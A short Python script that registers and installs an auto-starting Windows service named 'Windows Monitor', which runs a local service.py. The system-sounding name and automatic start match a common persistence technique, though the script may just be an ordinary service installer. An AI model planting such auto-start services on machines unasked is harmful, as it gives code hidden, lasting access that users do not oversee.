import subprocess
import os
import sys

# create empty service
service = 'sc create WindowsMonitor  binpath= "python ' + \
              str(os.getcwd()) + '\service.py" DisplayName= "Windows Monitor" start= auto '

subprocess.run(service, shell=True)

# install service
start_service = str("python " + str(os.path.realpath(os.path.dirname(sys.argv[0]))) + "\service.py install")
subprocess.run(start_service, shell=True)

